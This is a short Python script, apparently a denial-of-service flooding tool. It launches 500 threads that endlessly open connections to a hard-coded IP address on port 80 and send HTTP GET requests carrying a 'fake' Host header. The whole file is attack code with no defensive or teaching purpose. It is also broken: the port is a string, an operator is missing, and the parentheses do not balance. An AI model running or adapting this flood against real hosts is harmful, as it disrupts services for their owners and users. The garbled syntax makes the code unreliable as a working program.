#!/usr/bin/env python3
import threading
import socket

target = '202.162.209.219'
port = '80'
fake_ip = '194.21.23.43'

already_connected = 0

def attack():
    while True:
        s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target "http/1.1\r\n")).encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n")).encode('ascii'), (target, port))
        s.close()

        global already_connected
        already_connected += 1
        print(already_connected)

for i in range(500):
    thread =threading.Thread(target=attack)
    thread.start()
